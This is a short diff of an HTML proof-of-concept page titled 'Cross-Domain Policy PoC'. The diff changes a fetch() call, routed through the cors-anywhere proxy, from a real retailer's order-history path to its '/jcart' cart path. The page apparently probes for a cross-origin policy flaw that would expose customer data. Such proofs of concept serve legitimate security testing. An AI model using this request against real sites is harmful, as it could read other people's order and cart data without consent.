@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Cross-Domain Policy  PoC</title>
+    <title>Cross-Domain PolicyPoC</title>
     <script>
         function makeRequest() {
-            fetch('https://cors-anywhere.herokuapp.com/https://www.oneplus.in/sales/order/history')
+            fetch('https://cors-anywhere.herokuapp.com/https://www.oneplus.in/jcart')
                 .then(response => {
                     if (response.ok) {
                         return response.text();
